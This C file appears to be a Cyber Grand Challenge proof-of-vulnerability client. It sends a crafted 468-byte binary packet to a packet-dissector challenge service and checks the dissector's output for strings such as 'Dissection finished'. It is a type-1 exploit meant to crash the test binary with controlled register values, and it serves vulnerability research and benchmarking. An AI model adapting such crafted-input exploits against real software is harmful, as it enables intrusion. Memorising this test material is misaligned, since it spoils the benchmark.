#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd4\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xbc\x01\x00\x00\xb4\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb4\x01\x00\x00"
         "\xa5\x6f\x89\x01\xe5\xd5\xaf\x77\x6d\x0b\xbf\x49\x70\x5c\x66\xc5"
         "\xed\x2e\x7b\x63\x51\x00\x00\x00\x01\x00\x02\xff\x45\xab\x3f\x38"
         "\x82\x0a\x16\x44\x97\xe3\x15\xae\x03\x7b\x4c\xe2\x7c\x4d\x06\xc9"
         "\x9b\x95\xeb\xd5\x9e\xe6\xe6\xd7\xf1\x62\xb0\x76\xec\xc8\xe0\xd0"
         "\x3e\x18\x83\xf1\x54\x43\x77\x35\x03\x69\x0e\x97\xc7\x14\xd1\xaa"
         "\x8f\xe1\x3d\xef\xd8\x9c\xbb\x4c\xd2\x01\x3c\x7c\x14\xc5\x9d\x40"
         "\xf1\xc8\x40\x4e\x8c\xcd\x51\xbd\x8b\xc3\xc1\x8f\x77\x58\x7e\x10"
         "\x2a\x58\xb6\xb6\xef\x97\xb3\xca\x92\x2d\xae\xad\x77\x17\xa2\x9d"
         "\x7e\x57\xfa\x54\x1a\x09\xbb\xd9\xf1\x6b\x86\x5d\xe0\x84\x97\x41"
         "\x26\xd5\x91\xa4\xbe\x52\x63\x1d\x1d\x5f\x8f\x42\x3e\x02\x4d\xb5"
         "\xe3\xe1\xb3\x41\xa4\x0c\x79\x95\x66\x7e\x34\x4b\x4d\x05\xb7\x9f"
         "\xb0\xde\x45\x4f\x75\x35\xf5\xae\xde\x67\x62\x04\x27\xdb\xe9\x52"
         "\x24\x60\x2c\x87\xab\xff\x25\x41\xaf\xfe\x7f\xe0\x28\x62\x3a\x4a"
         "\xca\x7f\x0d\x23\xdd\x57\x39\xce\x1e\xd4\xd2\x7e\x28\x7d\x13\xab"
         "\x8c\xdc\xfb\x8e\x32\xe6\x7a\xab\x4c\x32\x26\x93\x06\x29\x63\x4f"
         "\x36\xe4\x85\x74\x31\x03\xb7\x64\x92\xe8\x44\x8a\x6b\x2b\x8a\x8b"
         "\x5e\x62\x44\x0f\xd2\x5f\x11\xc8\x71\x60\x51\x72\x65\x65\x3a\x64"
         "\xaf\x27\x9c\x34\xa3\xa0\xea\xf2\x55\xf4\x5e\x01\xeb\x41\x00\x3c"
         "\xe5\x90\xd1\x85\x1f\x32\x56\xc5\x81\xe1\xe3\xaf\x1b\x31\x04\xdd"
         "\x01\x00\x7f\xe2\x7e\x0c\x4c\x85\x4d\x8d\x54\x28\x04\x8b\x0d\xf9"
         "\x69\xd2\x45\x8f\x6c\x4e\x7b\x01\x00\x77\xde\xf3\xdf\x37\x6b\xe4"
         "\x27\xd4\x01\xc1\x38\x10\x0e\x2c\x01\x00\x7f\xe1\x16\xab\x66\x81"
         "\xcf\xfa\x52\x01\x00\xdd\xb5\xaf\x5e\x47\xd5\x74\x4c\xfa\x54\x3f"
         "\x17\xdc\xe0\xb3\x01\x00\x2d\x7b\x43\x5f\x70\x01\x00\x6c\xd3\x18"
         "\x7e\x13\x01\x00\x07\x92\xc3\x9b\x85\x80\xd1\x46\x0a\xd9\xa3\xfe"
         "\x41\x00\x01\x00\x93\x01\x8f\x68\x69\x01\x00\x37\x00\xa5\x1f\x2f"
         "\xa7\x0f\x67\x49\x03\x3c\x62\x62\xc6\x69\xdc\x07\x58\xdd\xca\xf7"
         "\x85\xe5\x41\x00";
      static unsigned int write_00001_00000_len = 468;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamasmolt
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x73\x6d\x6f\x6c\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
